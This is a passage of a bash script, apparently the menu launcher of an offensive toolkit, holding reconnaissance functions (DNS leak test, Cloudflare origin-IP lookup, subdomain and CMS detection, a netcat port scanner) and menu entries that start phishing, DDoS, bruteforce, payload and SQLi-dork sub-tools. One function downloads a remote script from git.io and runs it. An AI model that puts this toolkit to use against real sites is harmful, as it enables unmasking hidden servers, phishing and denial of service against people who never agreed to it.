checkdns2=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns2" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns2)
citydns2=$( grep -o "City Location:.*" checkdns2 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns2=$(grep -o 'Country:.*' checkdns2 | cut -d ">" -f3 | cut -d "&" -f1)
sleep 10
printf "\e[1;92m[*] Executing DNS Leak test \e[0m\e[1;77m[3/3]...\e[0m\n"
dns3=$(nslookup whoami.akamai.net | grep -o 'Address:.*' | sed -n '2,2p' | cut -d " " -f2)
checkdns3=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$dns3" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > checkdns3)
citydns3=$( grep -o "City Location:.*" checkdns3 | cut -d "<" -f3 | cut -d ">" -f2)
countrydns3=$(grep -o 'Country:.*' checkdns3 | cut -d ">" -f3 | cut -d "&" -f1)

printf "\n\e[1;93m[*] Results:\e[0m\n"
printf "\n"
printf "\e[1;92mTest 1:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns1 $countrydns1 $citydns1
printf "\e[1;92mTest 2:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns2 $countrydns2 $citydns2
printf "\e[1;92mTest 3:\e[0m\e[1;77m %s, \e[1;92mCountry:\e[0m\e[1;77m %s,\e[0m\e[1;92m City:\e[0m\e[1;77m %s\e[0m\n" $dns3 $countrydns3 $citydns3
printf "\n"
printf "\e[1;93m[*] If you see your city your DNS is leaking\e[0m\n"
printf "\e[1;92m[*] Perform this test more than 1 time for best result\e[0m\n"
if [[ -e checkdns1 ]]; then
rm -rf checkdns1
fi
if [[ -e checkdns2 ]]; then
rm -rf checkdns2
fi
if [[ -e checkdns3 ]]; then
rm -rf checkdns3
fi
}

speedtest() {

## Speedtest-cli by Matt Martz
printf "\e[1;92m[*] Calculating your Internet Speed, please wait...\e[0m\n"
printf "\e[1;77m\n"
echo "$(curl -skLO https://git.io/speedtest.sh && chmod +x speedtest.sh && ./speedtest.sh --simple)"
printf "\e[0m\n"
if [[ -e speedtest.sh ]]; then
rm -rf speedtest.sh
fi
}

cloudflare() {


read -p $'\e[1;92m[*] Cloudflare site: \e[0m' cf_site

checkifcloudflare=$(curl -L -s "https://dns-api.org/NS/$cf_site" | grep -o 'cloudflare' | head -n1)

if [[ $checkifcloudflare == *'cloudflare'* ]]; then
checkCF=$(curl -s --request POST http://www.crimeflare.biz:82/cgi-bin/cfsearch.cgi -d "cfS=$cf_site" -L --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > cloudflare.log)
foundcf=$(grep -o "A direct-connect IP address was found" cloudflare.log)

if [[ $foundcf == *'A direct-connect IP address was found'* ]]; then
IFS=$'\n'
real_ip=$(grep "<font color=#c00000>" cloudflare.log | sed -n '2,2p' | cut -d "<" -f2 | cut -d ">" -f2)
printf "\e[1;92m[*] Real IP:\e[0m\e[1;77m %s\e[0m\n" $real_ip
else
cloudflare2
#printf "\e[1;92m[!] Not Found!\e[0m\n"
fi
else
printf "\e[1;93m[!] This site isnt Cloudflare\e[0m\n"
fi
if [[ -e cloudflare.log ]]; then
rm -rf cloudflare.log
fi
}

cloudflare2() {

ping -c1 "ftp.$cf_ip" 2> /dev/null > cf2
checkcf2=$(grep -o '(.*)' cf2 | cut -d " " -f1 | head -n1 | tr -d ")" | tr -d "(")

if [[ $checkcf2 != "" ]]; then
ipcf2=$(curl -s -L "www.ip-tracker.org/locator/ip-lookup.php?ip=$checkcf2" --user-agent "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31" > cf2.log)
check_ipcf2=$(grep -o "ISP:.*" cf2.log | cut -d "<" -f3 | cut -d ">" -f2)

if [[ $check_ipcf2 != *'CloudFlare'* ]]; then

printf "\e[1;92m[*] IP Found:\e[0m\e[1;77m %s\e[0m\n" $checkcf2
else
printf "\e[1;93m[!] IP Not Found! %s\e[0m\n"
fi

else
printf "\e[1;93m[!] IP Not Found! %s\e[0m\n"

fi
if [[ -e cf2 ]]; then
rm -rf cf2
fi
}

subdomain() {

read -p $'\e[1;92m[*] Site: \e[0m' subdomainsite

checksubdomain=$(curl -L -s "https://www.pagesinventory.com/search/?s=$subdomainsite" > infodomain.log)
IFS=$'\n'
checksite=$(grep -o -P "domain/.{0,40}.$subdomainsite.html" infodomain.log | cut -d "." -f1 | cut -d "/" -f2)

if [[ $checksite != "" ]]; then
IFS=$'\n'
printf "\e[1;92m[*] Subdomain found:\e[0m\n"
printf "\e[1;77m%s\e[0m\n" $checksite
fi

if [[ -e infodomain.log ]]; then
rm -rf infodomain.log
fi

}

checkcms() {

read -p $'\e[1;92m[*] Site: \e[0m' urlcms

checkcms=$(curl -L -s "https://whatcms.org/APIEndpoint?key=759cba81d90c6188ec5f7d2e2bf8568501a748d752fd2acdba45ee361181f58d07df7d&url=$urlcms" > checkcms.log)
detected=$(grep -o 'Success' checkcms.log)

if [[ $detected == *'Success'* ]]; then
cms=$(grep -o '"name":.*,' checkcms.log | cut -d "," -f1 | cut -d ":" -f2 | tr -d '\"')
printf "\e[1;92m[*] CMS Found:\e[0m\e[1;77m %s\e[0m\n" $cms
fi 

many_requests=$(grep -o 'Too Many Requests' checkcms.log)
if [[ $failed = *'Too Many Requests'* ]]; then
printf "\e[1;93m[!] Too Many Requests, try later.\e[0m\n"
fi


failed=$(grep -o 'Failed: CMS or Host Not Found' checkcms.log)
if [[ $failed = *'Failed: CMS or Host Not Found'* ]]; then
printf "\e[1;93m[!] Failed: CMS or Host Not Found\e[0m\n"
fi
if [[ -e checkcms.log ]]; then
rm -rf checkcms.log
fi
}

function portrange() {
if [[ -e open.ports ]]; then
rm -rf open.ports
fi
if [[ -e ports ]]; then
rm -rf ports
fi

read -p $'\e[1;92m[*] Port Range (E.g. 1 1000): \e[0m' port_range
for x in $(seq $port_range); do echo $x >> ports; done
default_threads="10"
read -p $'\e[1;92m[*] Threads (Default: 10): \e[0m' threads
threads="${threads:-${default_threads}}"
count_ports=$(wc -l ports | cut -d " " -f1)

printf "\e[1;91m[*] Press Ctrl + C to stop\n\e[0m"
token=0
startline=1
endline="$threads"
while [ $token -lt $count_ports ]; do
IFS=$'\n'
for port in $(sed -n ''$startline','$endline'p' ports); do

IFS=$'\n'
countport=$(grep -n -x "$port" ports | cut -d ":" -f1)


let token++
printf "\e[1;77mScanning port (%s/%s)\e[0m\n" $countport $count_ports

{(trap '' SIGINT && scan=$( nc -z -v -w3 $host $port 2>&1 >/dev/null | grep -o 'open'); if [[ $scan == "open" ]]; then printf "\e[1;92m \n [*] Port Open:\e[0m\e[1;77m %s\e[0m\n\n" $port; printf "%s\n" $port >> open.ports ; fi; ) } & done; wait $!;

let startline+=$threads
let endline+=$threads

done
if [[ -e open.ports ]]; then
total=$(wc -l open.ports | cut -d " " -f1)
printf "\e[1;92m[*] Total Open ports:\e[0m\e[1;77m %s\e[0m\n" $total
printf "\e[1;77m\n"
cat open.ports
rm -rf open.ports
rm -rf ports
printf "\e[0m\n"
fi
exit 1

}

portscan() {

read -p $'\e[1;92m[*] Host: \e[0m' host
printf "\e[1;92m[*] Choose an option:\e[0m\n"
read -p $'\e[1;92m[*] \e[0m\e[1;77m1)\e[0m\e[1;92m Single Port, \e[0m\e[1;77m2)\e[0m\e[1;92m Port Range: \e[0m' choice_port

if [[ $choice_port == "1" ]]; then
read -p $'\e[1;92m[*] Port: \e[0m' single_port

check=$(nc -z -v -w3 $host $single_port 2>&1 >/dev/null | grep -o 'open')
if [[ $check == "open" ]]; then
printf "\e[1;92m[*] Open!\e[0m\n"
else
printf "\e[1;93m[*] Close!\e[0m\n"
fi
elif [[ $choice_port == "2" ]]; then
portrange
fi


}

myinfo() {
touch myinfo && echo "" > myinfo
curl "ifconfig.me/all" -s  > myinfo

my_ip=$(grep -o 'ip_addr:.*' myinfo | cut -d " " -f2)
remote_ip=$(grep -o 'remote_host:.*' myinfo | cut -d " " -f2)
printf "\e[1;92m[*] My ip:\e[0m\e[1;77m %s\e[0m\n" $my_ip
printf "\e[1;92m[*] Remote Host:\e[0m\e[1;77m %s\e[0m\n" $remote_ip
rm -rf myinfo
}

menu_anonsurf() {

clear
dir="tools/debiantor/"
printf "\e[1;92m[*] Anonymous Surf:\e[0m\n\n"
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Start\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Stop \e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] Status \e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_surf
if [[ $option_surf == 1 || $option_surf == 01 ]]; then
cd $dir
bash debiantor.sh --start
elif [[ $option_surf == 2 || $option_surf == 02 ]]; then
cd $dir
bash debiantor.sh --stop
elif [[ $option_surf == 3 || $option_surf == 03 ]]; then
cd $dir
bash debiantor.sh --status

elif [[ $option_surf == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_anonsurf
fi



}


menu_multitor() {

clear
dir="tools/multitor/"
printf "\e[1;92m[*] Multi-Tor:\e[0m\n\n"
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Start\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Stop \e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] Status \e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_multi
if [[ $option_multi == 1 || $option_multi == 01 ]]; then
cd $dir
bash multitor.sh --start
elif [[ $option_multi == 2 || $option_multi == 02 ]]; then
cd $dir
bash multitor.sh --stop
elif [[ $option_multi == 3 || $option_multi == 03 ]]; then
cd $dir
bash multitor.sh --status

elif [[ $option_multi == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_multi
fi



}

menu_portscan() {
clear
printf "\e[1;92m[*] Port Scan:\e[0m\n\n"
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Start\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Resume Session \e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_ps
if [[ $option_ps == 1 || $option_ps == 01 ]]; then
cd tools/netscan/
bash netscan.sh
elif [[ $option_ps == 2 || $option_ps == 02 ]]; then
cd tools/netscan/
bash netscan.sh --resume
elif [[ $option_pc == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_portscan
fi

}


menu_antiflood() {

clear
printf "\e[1;92m[*] Anti-Flood:\e[0m\n\n"
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Start\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Stop \e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] Status \e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m04\e[0m\e[1;93m] Config \e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_antif
if [[ $option_antif == 1 || $option_antif == 01 ]]; then
cd tools/antiflood/
bash antiflood.sh --start
elif [[ $option_antif == 2 || $option_antif == 02 ]]; then
cd tools/antiflood/
bash antiflood.sh --stop
elif [[ $option_antif == 3 || $option_antif == 03 ]]; then
cd tools/antiflood/
bash antiflood.sh --status
elif [[ $option_antif == 4 || $option_antif == 04 ]]; then
cd tools/antiflood/
bash antiflood.sh --config
elif [[ $option_antif == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_antiflood
fi



}

menu_blocktor() {

clear
printf "\e[1;92m[*] Block All Tor IP from accessing your Server:\e[0m\n\n"
printf "\e[1;93m[\e[0m\e[1;77m01\e[0m\e[1;93m] Start\e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m02\e[0m\e[1;93m] Stop \e[0m\n"
printf "\e[1;93m[\e[0m\e[1;77m03\e[0m\e[1;93m] Status \e[0m\n"
printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Back\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option_blocktor
if [[ $option_blocktor == 1 || $option_blocktor == 01 ]]; then
cd tools/blocktor/
bash blocktor.sh --start
elif [[ $option_blocktor == 2 || $option_blocktor == 02 ]]; then
cd tools/blocktor/
bash blocktor.sh --stop
elif [[ $option_blocktor == 3 || $option_blocktor == 03 ]]; then
cd tools/blocktor/
bash blocktor.sh --status


elif [[ $option_blocktor == 99 ]]; then
clear
menu
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu_blocktor
fi



}

banner() {
printf "\e[1;77m _______ _              _______ _           _              \n"
printf "(_______) |            (_______) |         (_)             \n"
printf "    _   | |__  _____    _      | |__   ___  _  ____ _____  \n"
printf "   | |  |  _ \| ___ |  | |     |  _ \ / _ \| |/ ___) ___ | \n"
printf "   | |  | | | | ____|  | |_____| | | | |_| | ( (___| ____| \n"
printf "   |_|  |_| |_|_____)   \______)_| |_|\___/|_|\____)_____) v1.0\e[0m\n"
printf "\n"
printf "            \e[1;93m.:.\e[0m\e[1;92m Coded by\e[0m\e[1;77m  @thelinuxchoice \e[0m\e[1;93m.:.\e[0m\n"
printf "\n"                                                          


}


menu() {
clear
banner
printf "\e[1;92m[\e[0m\e[1;77m01\e[0m\e[1;92m]\e[0m\e[1;93m Information Gathering\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m02\e[0m\e[1;92m]\e[0m\e[1;93m Generate Payload\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m Bruteforcers\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m04\e[0m\e[1;92m]\e[0m\e[1;93m Anonymous Surf\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m05\e[1;92m]\e[0m\e[1;93m Sqli Dork Scan\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m06\e[1;92m]\e[0m\e[1;93m Phishing Attack\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m07\e[1;92m]\e[0m\e[1;93m Multitor\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m08\e[1;92m]\e[0m\e[1;93m DDoS\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m09\e[1;92m]\e[0m\e[1;93m Switch Tor\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m10\e[1;92m]\e[0m\e[1;93m Anonymous Port Scan\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m11\e[1;92m]\e[0m\e[1;93m AntiFlood\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m12\e[1;92m]\e[0m\e[1;93m AntiTor\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m13\e[1;92m]\e[0m\e[1;93m Spider URL\e[0m\n"
printf "\e[1;92m[\e[0m\e[1;77m14\e[1;92m]\e[0m\e[1;93m Nmap Strategies\e[0m\n"

printf "\n"
printf "\e[1;93m[\e[0m\e[1;77m99\e[0m\e[1;93m]\e[0m\e[1;77m Exit\e[0m\n"
printf "\n"
read -p $'\e[1;92m[*] Choose an option:\e[0m\e[1;77m ' option

if [[ $option == 1 || $option == 01 ]]; then
menu_infog

elif [[ $option == 2 || $option == 02 ]]; then
menu_payload
elif [[ $option == 3 || $option == 03 ]]; then
menu_bruteforcers
elif [[ $option == 4 || $option == 04 ]]; then
menu_anonsurf
elif [[ $option == 5 || $option == 05 ]]; then
cd tools/sqliscan/
bash sqliscan.sh
elif [[ $option == 6 || $option == 06 ]]; then
clear
cd tools/shellphish/
bash shellphish.sh
elif [[ $option == 7 || $option == 07 ]]; then
menu_multitor
elif [[ $option == 8 || $option == 08 ]]; then
cd tools/ddostor/
bash ddostor.sh
elif [[ $option == 9 || $option == 09 ]]; then
cd tools/switchtor/
bash switchtor.sh
elif [[ $option == 10 ]]; then
menu_portscan
elif [[ $option == 11 ]]; then
menu_antiflood
elif [[ $option == 12 ]]; then
menu_blocktor
elif [[ $option == 13 ]]; then
cd tools/spidershell/
bash spidershell.sh
elif [[ $option == 14 ]]; then
cd tools/nmapstrategies/
bash nmapstrategies.sh
elif [[ $option  == 99 ]]; then
exit 1
else
printf "\e[1;93m[\e[1;77m!\e[0m\e[1;93m] Invalid option!\e[0m"
sleep 0.5
clear
menu
fi
}
menu
